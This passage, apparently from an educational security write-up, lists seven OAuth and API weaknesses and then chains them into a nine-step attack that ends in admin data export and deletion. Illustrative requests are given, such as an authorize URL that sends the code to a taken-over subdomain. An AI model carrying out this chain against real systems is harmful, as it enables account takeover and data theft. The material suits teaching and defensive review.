b) The 7 Vulnerabilities Present in the System:-
Before the attack begins, the system already contains seven small weaknesses.
• Vulnerability 1 — Wildcard Redirect URI
The OAuth client allows:
https://*.company.com/callback
This means any subdomain is trusted.

• Vulnerability 2 — Subdomain Takeover
An old DNS entry still points to a deleted cloud resource:
old.company.com
An attacker claims this domain.

• Vulnerability 3 — Open Redirect in the Web App
The application has:
/redirect?url=
Example:
https://app.company.com/redirect?url=https://site.com

• Vulnerability 4 — Authorization Code in URL
OAuth callback:
/callback?code=AUTH_CODE
Sensitive data exists in the URL.

• Vulnerability 5 — Third-Party Scripts on Callback Page
The callback page loads analytics:
<script src="tracker.example.com/script.js">
Browsers send the Referer header.

• Vulnerability 6 — APIs Accept ID Tokens
Backend APIs accept ID tokens instead of access tokens.

• Vulnerability 7 — APIs Do Not Validate Audience
APIs verify only:
signature
issuer
They ignore:
aud claim

c) The Complete Attack Kill Chain:
Now the attacker chains everything together.

Step 1 — Attacker takes over a subdomain
Because of DNS misconfiguration:
old.company.com
The attacker controls this domain.

Step 2 — Exploit wildcard redirect trust
Since OAuth allows:
https://*.company.com/callback
The attacker uses:
https://old.company.com/callback
Now the authorization server trusts it.

Step 3 — Start OAuth login
The attacker sends a link to the victim:
https://auth.company.com/authorize?
 client_id=webapp
 &redirect_uri=https://old.company.com/callback
The victim logs in at the legitimate IdP.

Step 4 — Authorization code delivered to attacker
After login:
https://old.company.com/callback?code=AUTH_CODE
The attacker receives the authorization code.

Step 5 — Code exchanged for tokens
The attacker calls the token endpoint:
POST /token
code=AUTH_CODE
They receive:
access_token
id_token

Step 6 — Token leakage through Referer
The attacker tricks the victim to access:
app.company.com/callback?code=AUTH_CODE
The page loads analytics.
The browser sends:
Referer:
https://app.company.com/callback?code=AUTH_CODE
The analytics server logs the code.

Step 7 — ID Token misuse
The attacker sends the ID token to APIs:
Authorization: Bearer ID_TOKEN
Because the gateway accepts ID tokens, the request succeeds.

Step 8 — Audience validation missing
The attacker uses a token issued for Profile API.
But sends it to:
Admin API
Since the API ignores the audience claim, it accepts the token.

Step 9 — Full compromise
The attacker now performs:
GET /admin/export-users
DELETE /admin/user
They have effectively escalated privileges.
